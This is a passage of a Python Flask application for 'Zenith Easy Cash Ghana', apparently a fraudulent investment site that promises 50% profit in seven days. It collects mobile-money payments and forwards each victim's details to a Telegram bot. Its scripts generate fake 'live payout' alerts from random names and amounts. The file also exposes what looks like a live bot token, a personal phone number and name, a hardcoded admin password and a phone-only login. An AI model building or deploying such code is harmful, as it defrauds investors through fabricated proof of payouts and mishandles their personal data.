from datetime import datetime, timedelta
import json
import os
import random
import time
import requests
from flask import (
    Flask,
    flash,
    jsonify,
    redirect,
    render_template_string,
    request,
    send_from_directory,
    session,
    url_for,
)
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = "zenith_easy_cash_secret_key"

DATA_FILE = "Master.json"
SETTINGS_FILE = "settings.json"
UPLOAD_FOLDER = "uploads"
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
  os.makedirs(UPLOAD_FOLDER)

# Default admin credentials
ADMIN_PASSWORD = "admin"

# --- TELEGRAM CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
TELEGRAM_CHAT_ID = "8393567505"
ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"  # Replace with your actual telegram username link


def send_telegram_alert(message, photo_path=None):
  if (
      TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN"
      or not TELEGRAM_BOT_TOKEN
  ):
    return
  try:
    if photo_path and os.path.exists(photo_path):
      url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
      with open(photo_path, "rb") as photo_file:
        requests.post(
            url,
            data={"chat_id": TELEGRAM_CHAT_ID, "caption": message, "parse_mode": "HTML"},
            files={"photo": photo_file},
            timeout=10,
        )
    else:
      url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
      payload = {
          "chat_id": TELEGRAM_CHAT_ID,
          "text": message,
          "parse_mode": "HTML",
      }
      requests.post(url, json=payload, timeout=5)
  except Exception as e:
    print(f"Telegram alert error: {e}")


# --- DATA UTILITIES ---
def load_settings():
  default_settings = {
      "momo_number": "0551338991",
      "momo_name": "EMELIA DOOWELPOUR",
  }
  if not os.path.exists(SETTINGS_FILE):
    with open(SETTINGS_FILE, "w") as f:
      json.dump(default_settings, f, indent=4)
    return default_settings
  try:
    with open(SETTINGS_FILE, "r") as f:
      return json.load(f)
  except Exception:
    return default_settings


def save_settings(settings):
  with open(SETTINGS_FILE, "w") as f:
    json.dump(settings, f, indent=4)


def load_investors():
  if not os.path.exists(DATA_FILE):
    return []
  try:
    with open(DATA_FILE, "r") as f:
      data = json.load(f)
      if isinstance(data, dict):
        return [data]
      if isinstance(data, list):
        return data
      return []
  except Exception:
    return []


def save_all_investors(investors):
  with open(DATA_FILE, "w") as f:
    json.dump(investors, f, indent=4)


def save_investor_data(data):
  investors = load_investors()
  investors.append(data)
  save_all_investors(investors)


# --- SPORTYBET / AVIATOR STYLE POPUP NOTIFICATION COMPONENT ---
SPORTYBET_POPUP_HTML = """
<style>
    #sportyToastContainer {
        position: fixed; bottom: 20px; left: 20px; z-index: 99999;
        display: flex; flex-direction: column; gap: 10px; pointer-events: none;
    }
    .sporty-toast {
        background: linear-gradient(135deg, #111b11, #1e3a1e);
        border-left: 4px solid #00ff66; color: #fff; padding: 12px 16px;
        border-radius: 8px; box-shadow: 0 6px 20px rgba(0,0,0,0.6);
        width: 300px; font-family: Arial, sans-serif; pointer-events: auto;
        transform: translateX(-120%); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.4s ease;
        opacity: 0;
    }
    .sporty-toast.show {
        transform: translateX(0); opacity: 1;
    }
    .sporty-header { display: flex; justify-content: space-between; font-size: 11px; color: #00ff66; font-weight: bold; margin-bottom: 3px; text-transform: uppercase; }
    .sporty-body { font-size: 13px; line-height: 1.3; color: #f3f4f6; }
    .sporty-body b { color: #facc15; }
</style>

<div id="sportyToastContainer"></div>

<script>
    const ghanaNames = [
        "Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", 
        "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Ama Serwaa", "Nii Armah",
        "Fiifi Kwakye", "Adwoa Pomaa", "Kwabena Appiah", "Yaa Asantewaa", "Kweku Bonsu",
        "Nana Yaw", "Efua Baker", "Owusu Ansah", "Latif Ibrahim", "Patience Mensah",
        "Selorm Agbeshie", "Dzifa Gidiglo", "Mahama Sadique", "Priscilla Quaye", "Bright Odoom"
    ];
    const towns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Koforidua", "Tema", "Wa", "Bolgatanga", "Obuasi"];
    const payoutTypes = ["50% Profit Payout", "50% Profit Payout", "50% Profit Payout", "Bonus Payout (GHs 50)", "Bonus Payout (GHs 100)", "Bonus Payout (GHs 200)", "Bonus Payout (GHs 20)"];

    function showSportyToast() {
        const container = document.getElementById('sportyToastContainer');
        if (!container) return;

        const name = ghanaNames[Math.floor(Math.random() * ghanaNames.length)];
        const town = towns[Math.floor(Math.random() * towns.length)];
        const type = payoutTypes[Math.floor(Math.random() * payoutTypes.length)];
        
        let rewardText = "";
        if (type.includes("50%")) {
            const base = Math.floor(Math.random() * 9500) + 200;
            const total = base * 1.5;
            rewardText = `Capital + 50% Profit = <b>GHs ${total.toLocaleString()}</b>`;
        } else {
            rewardText = `<b>${type}</b>`;
        }

        const toast = document.createElement('div');
        toast.className = 'sporty-toast';
        toast.innerHTML = `
            <div class="sporty-header"><span>⚡ Live Payout Alert</span><span>Just Now</span></div>
            <div class="sporty-body"><b>${name}</b> (${town}) won & cashed out ${rewardText} via MoMo!</div>
        `;

        container.appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 50);

        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 400);
        }, 3500);
    }

    // Fast popup every 3.5 to 5 seconds like Aviator/Sportybet
    setInterval(showSportyToast, 4000);
    setTimeout(showSportyToast, 1000);
</script>
"""

POPUP_MODAL_CSS = """
<style>
    .modal-overlay {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center;
        z-index: 9999; animation: fadeIn 0.3s ease-in-out;
    }
    .modal-card {
        background: #1e1e1e; color: #fff; width: 90%; max-width: 450px;
        padding: 30px; border-radius: 16px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        animation: scaleUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    .icon-container {
        width: 90px; height: 90px; margin: 0 auto 20px auto;
        background: #2e7d32; border-radius: 50%; display: flex; justify-content: center; align-items: center;
        box-shadow: 0 0 20px rgba(46, 125, 50, 0.6);
        animation: rotateIn 0.6s ease-in-out;
    }
    .checkmark { font-size: 45px; color: white; font-weight: bold; }
    .modal-card h3 { color: #4caf50; font-size: 24px; margin-bottom: 10px; }
    .modal-card p { color: #ccc; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
    .modal-btn {
        background: linear-gradient(135deg, #2e7d32, #4caf50); color: white; border: none;
        padding: 12px 25px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%;
        box-shadow: 0 4px 15px rgba(46, 125, 50, 0.4); transition: opacity 0.2s; text-decoration: none; display: inline-block;
        box-sizing: border-box; margin-top: 10px;
    }
    .modal-btn:hover { opacity: 0.9; color: #fff; }
    .telegram-quick-btn { background: linear-gradient(135deg, #0088cc, #229ed9); }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @keyframes scaleUp { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
</style>

<div class="modal-overlay" id="successModal">
    <div class="modal-card">
        <div class="icon-container"><div class="checkmark">✓</div></div>
        <h3>{{ modal_title }}</h3>
        <p>{{ modal_desc|safe }}</p>
        <a href="{{ admin_telegram_link }}" target="_blank" class="modal-btn telegram-quick-btn">💬 Chat Admin on Telegram for Quick Approval</a>
        <button class="modal-btn" onclick="closeModal()" style="background: #444; margin-top: 8px;">Continue</button>
    </div>
</div>
<script>function closeModal() { document.getElementById('successModal').style.display = 'none'; }</script>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zenith Easy Cash Ghana - Online Registration</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2, h3 { color: #028a0f; text-align: center; }
        .instructions { background: #e8f5e9; padding: 15px; border-left: 5px solid #2e7d32; margin-bottom: 20px; font-size: 14px; line-height: 1.6; }
        .momo-box { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-bottom: 20px; border-radius: 5px; text-align: center; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #1b5e20; }
        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
        .nav-links { text-align: center; margin-top: 20px; font-size: 14px; display: flex; justify-content: center; gap: 15px; }
        .nav-links a { color: #028a0f; text-decoration: none; font-weight: bold; }
        .telegram-float-btn { display: block; background: #0088cc; color: white; text-align: center; padding: 10px; border-radius: 4px; margin-top: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
        .telegram-float-btn:hover { background: #006699; }
    </style>
</head>
<body>
    {{ sporty_toast_html|safe }}
    <div class="container">
        <h2>Zenith Easy Cash Ghana</h2>
        <h3>Online Investor Registration & Portal</h3>

        <div class="instructions">
            <strong>Investment Guidelines & Payout Structure:</strong>
            <ul>
                <li>Minimum Investment: <strong>200 GHs</strong> | Maximum Investment: <strong>500,000 GHs</strong></li>
                <li>Standard Returns: <strong>50% Profit Payout</strong> on top of capital upon maturity!</li>
                <li>Bonus Payouts: Referral & Milestone bonuses (GHs 20, 50, 100, 200) credited instantly.</li>
            </ul>
        </div>

        <div class="momo-box">
            <strong>COMPANY MOMO NUMBER:</strong> {{ settings.momo_number }}<br>
            <strong>NAME:</strong> {{ settings.momo_name }}
        </div>

        {% with messages = get_flashed_messages() %}
          {% if messages %}
            <div class="flash">{{ messages[0] }}</div>
          {% endif %}
        {% endwith %}

        <form method="POST" action="{{ url_for('index') }}" enctype="multipart/form-data">
            <div class="form-group">
                <label>Full Name:</label>
                <input type="text" name="name" required placeholder="Enter your full name">
            </div>
            <div class="form-group">
                <label>Phone Number (Used for Login):</label>
                <input type="text" name="number" required placeholder="e.g., 0501234567">
            </div>
            <div class="form-group">
                <label>Investment Amount (GHs):</label>
                <input type="number" name="amount" step="0.01" min="200" max="500000" required placeholder="Min 200 - Max 500,000">
            </div>
            <div class="form-group">
                <label>Work / Job:</label>
                <input type="text" name="work" required placeholder="Your occupation">
            </div>
            <div class="form-group">
                <label>Region / Town:</label>
                <input type="text" name="region" required placeholder="e.g., Accra, Kumasi">
            </div>
            <div class="form-group">
                <label>Payment Proof (Transaction ID OR Screenshot):</label>
                <input type="text" name="transaction_id" placeholder="Enter MoMo Transaction ID">
                <div style="margin-top: 8px;">
                    <input type="file" name="payment_screenshot" accept="image/*" style="border:none; padding:0;">
                    <small style="color: #666;">Upload payment screenshot image</small>
                </div>
            </div>
            <button type="submit">Submit Registration & Investment</button>
        </form>

        <a href="{{ admin_telegram_link }}" target="_blank" class="telegram-float-btn">💬 Instant Admin Approval via Telegram</a>

        <div class="nav-links">
            <a href="{{ url_for('login') }}">🔑 Investor Login</a>
            <a href="{{ url_for('track') }}">🔍 Track Investment</a>
        </div>
    </div>

    {% if show_modal %}
        {{ popup_html|safe }}
    {% endif %}
</body>
</html>
"""

INVESTOR_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investor Login - Zenith Easy Cash</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #028a0f; text-align: center; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #1b5e20; }
        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
        .back { text-align: center; margin-top: 15px; }
        .back a { color: #028a0f; text-decoration: none; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body>
    {{ sporty_toast_html|safe }}
    <div class="container">
        <h2>Investor Portal Login</h2>
        <p style="text-align: center; color: #666; font-size: 13px; margin-bottom: 20px;">Access your personal dashboard using your registered phone number.</p>
        
        {% with messages = get_flashed_messages() %}
          {% if messages %}
            <div class="flash">{{ messages[0] }}</div>
          {% endif %}
        {% endwith %}

        <form method="POST">
            <div class="form-group">
                <label>Phone Number:</label>
                <input type="text" name="number" required placeholder="e.g., 0501234567">
            </div>
            <button type="submit">Login to Dashboard</button>
        </form>
        <div class="back">
            <a href="{{ url_for('index') }}">← Back to Home</a>
        </div>
    </div>
</body>
</html>
"""

INVESTOR_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investor Dashboard - Zenith Easy Cash</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .main-layout { max-width: 1050px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
        .dashboard-container { flex: 2; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .sidebar-ticker { flex: 1; background: #111; color: #00ff66; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); position: sticky; top: 20px; max-height: 80vh; overflow-y: auto; }
        h2 { color: #028a0f; margin-top: 0; }
        .logout { float: right; }
        .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
        .card { background: #f1f8e9; padding: 15px; border-radius: 5px; margin-top: 15px; border-left: 5px solid #2e7d32; line-height: 1.5; }
        .btn-withdraw { background: #028a0f; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; }
        .btn-topup { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer;}
        .topup-box { background: #fff8e1; padding: 10px; margin-top: 10px; border-radius: 4px; }
        .loading-badge { display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }
        .spinner { width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .countdown-box { background: #fffbeb; border: 1px solid #f59e0b; padding: 10px; border-radius: 6px; margin-top: 10px; text-align: center; color: #b45309; font-weight: bold; font-size: 13px; }
        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
        
        /* Sidebar Side Ticker items */
        .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
        .side-ticker-item b { color: #facc15; }
    </style>
</head>
<body>
    {{ sporty_toast_html|safe }}
    <div class="main-layout">
        <div class="dashboard-container">
            <div>
                <h2>Welcome, {{ investor_name }}</h2>
                <div class="logout"><a href="{{ url_for('logout') }}">Logout</a></div>
                <div style="clear: both;"></div>
            </div>
            <p style="color: #666; font-size: 14px;">Monitor your active investments, review 50% profit countdowns, and manage top-ups below.</p>

            {% with messages = get_flashed_messages() %}
              {% if messages %}
                <div class="flash">{{ messages[0] }}</div>
              {% endif %}
            {% endwith %}

            {% if investors %}
                {% for inv in investors %}
                <div class="card">
                    <p><strong>Capital Amount:</strong> {{ inv.amount }} GHs <span style="color:#028a0f; font-size:12px;">(+50% Expected Return: GHs {{ inv.expected_return }})</span></p>
                    <p><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
                    <p><strong>Job / Region:</strong> {{ inv.work }} / {{ inv.region }}</p>
                    <p><strong>Registered On:</strong> {{ inv.date_time }}</p>
                    <p><strong>Maturity Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{ inv.maturity_date }}</span></p>
                    
                    <p><strong>Status:</strong> 
                        {% if inv.status == 'Pending Admin Payment Confirmation' %}
                            <span style="color: #c2410c;">⏳ Pending Admin Confirmation</span>
                            <div class="countdown-box" id="pendingTimer_{{ loop.index }}" data-time="{{ inv.date_time }}">
                                Approval Pending...
                            </div>
                            <a href="{{ admin_telegram_link }}" target="_blank" style="display:block; text-align:center; background:#0088cc; color:#fff; padding:6px; border-radius:4px; margin-top:8px; text-decoration:none; font-size:13px; font-weight:bold;">💬 Chat Admin on Telegram for Instant Approval</a>
                        {% elif inv.status == 'Payment Confirmed & Active' %}
                            <div class="loading-badge">
                                <div class="spinner"></div> Investment Active & Yielding 50% Profit...
                            </div>
                        {% elif inv.status == 'Withdrawal Requested' %}
                            <span style="color: #1d4ed8; font-weight: bold;">📥 Withdrawal Requested (Processing Payout)</span>
                        {% elif inv.status == 'Withdrawn Completed' %}
                            <span style="color: #15803d; font-weight: bold;">✅ Completed & Paid Out (Capital + 50% Profit)</span>
                        {% else %}
                            <span style="color: #555; font-weight: bold;">{{ inv.status }}</span>
                        {% endif %}
                    </p>
                    
                    {% if inv.status == 'Payment Confirmed & Active' %}
                    <form action="{{ url_for('topup', index=inv.global_idx) }}" method="POST" class="topup-box" enctype="multipart/form-data">
                        <label style="font-size:12px;">Top-Up Capital (GHs):</label>
                        <input type="number" name="topup_amount" min="10" step="0.01" required placeholder="Enter amount to add" style="padding:6px; margin-bottom:5px; width:100%; box-sizing:border-box;">
                        <input type="text" name="topup_proof" placeholder="Transaction ID or leave blank" style="padding:5px; margin-bottom:5px; font-size:12px; width:100%; box-sizing:border-box;">
                        <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:5px;">
                        <button type="submit" class="btn-topup">Submit Top-Up</button>
                    </form>
                    {% endif %}

                    {% if inv.can_withdraw and inv.status != 'Withdrawal Requested' and inv.status != 'Withdrawn Completed' %}
                        <a href="{{ url_for('withdraw', index=inv.global_idx) }}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{ inv.expected_return }})</a>
                    {% endif %}
                </div>
                {% endfor %}
            {% else %}
                <p style="text-align:center; color:#666;">No investment records found.</p>
            {% endif %}
        </div>

        <!-- Sidebar Live Ticker -->
        <div class="sidebar-ticker">
            <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Payout Feed</h3>
            <div id="sideTickerList">
                <!-- Dynamically injected feeds -->
            </div>
        </div>
    </div>

    <script>
        // Live elapsed timer for pending approvals
        function updateTimers() {
            document.querySelectorAll('.countdown-box').forEach(el => {
                const regDateStr = el.getAttribute('data-time');
                const regDate = new Date(regDateStr.replace(/-/g, "/"));
                const now = new Date();
                const diff = Math.floor((now - regDate) / 1000);
                if (diff >= 0) {
                    const hrs = Math.floor(diff / 3600);
                    const mins = Math.floor((diff % 3600) / 60);
                    const secs = diff % 60;
                    el.innerHTML = `⏱️ Waiting Time Elapsed: ${hrs}h ${mins}m ${secs}s (Awaiting Approval)`;
                }
            });
        }
        setInterval(updateTimers, 1000);
        updateTimers();

        // Sidebar live ticker generator
        const sideNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Ama Serwaa", "Nii Armah"];
        const sideTowns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema"];
        
        function addSideTickerItem() {
            const list = document.getElementById('sideTickerList');
            if (!list) return;
            const name = sideNames[Math.floor(Math.random() * sideNames.length)];
            const town = sideTowns[Math.floor(Math.random() * sideTowns.length)];
            const amt = (Math.floor(Math.random() * 9500) + 200) * 1.5;
            
            const item = document.createElement('div');
            item.className = 'side-ticker-item';
            item.innerHTML = `<b>${name}</b> (${town})<br>Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo`;
            
            list.prepend(item);
            if (list.children.length > 6) {
                list.lastChild.remove();
            }
        }
        setInterval(addSideTickerItem, 3000);
        addSideTickerItem();
        addSideTickerItem();
    </script>
</body>
</html>
"""

TRACK_TEMPLATE = INVESTOR_DASHBOARD_TEMPLATE  # Unified view or fallback


ADMIN_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #028a0f; text-align: center; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #1b5e20; }
        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
    </style>
</head>
<body>
    {{ sporty_toast_html|safe }}
    <div class="container">
        <h2>Admin Authentication</h2>
        {% with messages = get_flashed_messages() %}
          {% if messages %}
            <div class="flash">{{ messages[0] }}</div>
          {% endif %}
        {% endwith %}
        <form method="POST">
            <div class="form-group">
                <label>Admin Password:</label>
                <input type="password" name="password" required placeholder="Enter password">
            </div>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""

ADMIN_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Zenith Easy Cash</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 1200px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #028a0f; float: left; margin-top: 0; }
        .logout { float: right; }
        .logout a { background: #c62828; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 14px; }
        .settings-box { background: #fff8e1; border: 1px solid #ffa000; padding: 15px; margin-bottom: 25px; border-radius: 5px; clear: both; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; font-size: 12px; }
        th { background-color: #2e7d32; color: white; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        .btn-action { background: #2e7d32; color: white; padding: 5px 8px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 11px; border: none; cursor: pointer; display: inline-block; margin: 2px;}
        .btn-payout { background: #d32f2f; }
        .btn-delete { background: #6b7280; }
        .status-pending { color: #e65100; font-weight: bold; }
        .clear { clear: both; }
        img.proof-thumb { width: 50px; height: 50px; object-fit: cover; border-radius: 4px; border: 1px solid #ccc; cursor: pointer; }
        .edit-time-form { display: flex; gap: 5px; margin-top: 5px; align-items: center; }
        .edit-time-form input { padding: 4px; font-size: 11px; width: 120px; }
    </style>
</head>
<body>
    {{ sporty_toast_html|safe }}
    <div class="container">
        <div>
            <h2>Admin Dashboard</h2>
            <div class="logout"><a href="{{ url_for('admin_logout') }}">Logout</a></div>
            <div class="clear"></div>
        </div>

        <div class="settings-box">
            <h3>⚙️ Update Company Payment Details</h3>
            <form method="POST" action="{{ url_for('update_settings') }}" style="display: flex; gap: 10px; align-items: flex-end;">
                <div style="flex: 1;">
                    <label style="font-size: 12px; font-weight:bold;">MoMo Number:</label>
                    <input type="text" name="momo_number" value="{{ settings.momo_number }}" required style="padding: 8px; width: 100%; box-sizing: border-box;">
                </div>
                <div style="flex: 2;">
                    <label style="font-size: 12px; font-weight:bold;">Account Name:</label>
                    <input type="text" name="momo_name" value="{{ settings.momo_name }}" required style="padding: 8px; width: 100%; box-sizing: border-box;">
                </div>
                <div>
                    <button type="submit" style="background: #ffa000; color: white; border: none; padding: 9px 15px; font-weight: bold; border-radius: 4px; cursor: pointer;">Update Details</button>
                </div>
            </form>
        </div>

        <h3>Registered Investors & Active Accounts Management</h3>
        <table>
            <thead>
                <tr>
                    <th>Name / Number</th>
                    <th>Capital & Proof</th>
                    <th>Job / Region</th>
                    <th>Registered</th>
                    <th>Maturity Time & Date (Editable)</th>
                    <th>Status</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                {% if investors %}
                    {% for idx, inv in enumerate(investors) %}
                    <tr>
                        <td><strong>{{ inv.name }}</strong><br>{{ inv.number }}</td>
                        <td>
                            <strong>{{ inv.amount }} GHs</strong><br>
                            <small style="color:#028a0f;">Return: {{ inv.expected_return }} GHs</small><br>
                            <small>ID: {{ inv.transaction_id }}</small><br>
                            {% if inv.screenshot %}
                                <a href="{{ url_for('uploaded_file', filename=inv.screenshot) }}" target="_blank">
                                    <img src="{{ url_for('uploaded_file', filename=inv.screenshot) }}" class="proof-thumb" title="Click to view full screenshot">
                                </a>
                            {% endif %}
                        </td>
                        <td>{{ inv.work }}<br><small>{{ inv.region }}</small></td>
                        <td>{{ inv.date_time }}</td>
                        <td>
                            <span>{{ inv.maturity_date }}</span>
                            <form action="{{ url_for('update_maturity', index=idx) }}" method="POST" class="edit-time-form">
                                <input type="text" name="new_maturity" value="{{ inv.maturity_date }}" required title="Format: YYYY-MM-DD HH:MM:SS">
                                <button type="submit" class="btn-action" style="background:#0284c7;">Set Time</button>
                            </form>
                        </td>
                        <td><span class="status-pending">{{ inv.status }}</span></td>
                        <td>
                            {% if inv.status == 'Pending Admin Payment Confirmation' %}
                                <form action="{{ url_for('confirm_payment', index=idx) }}" method="POST" style="display:inline;">
                                    <button type="submit" class="btn-action">Confirm</button>
                                </form>
                            {% elif inv.status == 'Withdrawal Requested' %}
                                <form action="{{ url_for('complete_withdrawal', index=idx) }}" method="POST" style="display:inline;">
                                    <button type="submit" class="btn-action btn-payout">Pay Out</button>
                                </form>
                            {% else %}
                                <span>{{ inv.status }}</span>
                            {% endif %}
                            
                            <form action="{{ url_for('delete_investor', index=idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete this record?');">
                                <button type="submit" class="btn-action btn-delete">Delete</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                {% else %}
                    <tr>
                        <td colspan="7" style="text-align: center; color: #666;">No investor registrations found yet.</td>
                    </tr>
                {% endif %}
            </tbody>
        </table>
    </div>
</body>
</html>
"""


# --- ROUTES ---


@app.route("/", methods=["GET", "POST"])
def index():
  settings = load_settings()
  if request.method == "POST":
    try:
      amount = float(request.form["amount"])
      if amount < 200 or amount > 500000:
        flash("Investment amount must be between 200 GHs and 500,000 GHs.")
        return redirect(url_for("index"))

      transaction_id = request.form.get("transaction_id", "").strip()
      file = request.files.get("payment_screenshot")

      filename = ""
      if file and file.filename != "":
        filename = secure_filename(
            f"{int(time.time())}_{file.filename}"
        )
        file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))

      if not transaction_id and not filename:
        flash(
            "Please provide either a Transaction ID or upload a payment"
            " screenshot."
        )
        return redirect(url_for("index"))

      now = datetime.now()
      maturity = now + timedelta(days=7)
      expected_return = amount * 1.5

      investor_data = {
          "name": request.form["name"],
          "number": request.form["number"].strip(),
          "amount": amount,
          "expected_return": expected_return,
          "work": request.form["work"],
          "region": request.form["region"],
          "transaction_id": transaction_id
          if transaction_id
          else "Uploaded Screenshot",
          "screenshot": filename,
          "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
          "maturity_date": maturity.strftime("%Y-%m-%d %H:%M:%S"),
          "status": "Pending Admin Payment Confirmation",
      }

      save_investor_data(investor_data)

      alert_msg = (
          f"🚨 <b>NEW INVESTMENT REGISTRATION</b>\n\n"
          f"👤 <b>Name:</b> {investor_data['name']}\n"
          f"📞 <b>Number:</b> {investor_data['number']}\n"
          f"💰 <b>Capital:</b> GHs {investor_data['amount']}\n"
          f"📈 <b>Expected Return (50%):</b> GHs {investor_data['expected_return']}\n"
          f"🧾 <b>Proof:</b> {investor_data['transaction_id']}\n"
          f"🛠 <b>Job:</b> {investor_data['work']}\n"
          f"📍 <b>Region:</b> {investor_data['region']}\n"
          f"⏳ <b>Maturity:</b> {investor_data['maturity_date']}"
      )
      photo_path = (
          os.path.join(app.config["UPLOAD_FOLDER"], filename)
          if filename
          else None
      )
      send_telegram_alert(alert_msg, photo_path)

      modal_title = "Successfully Registered!"
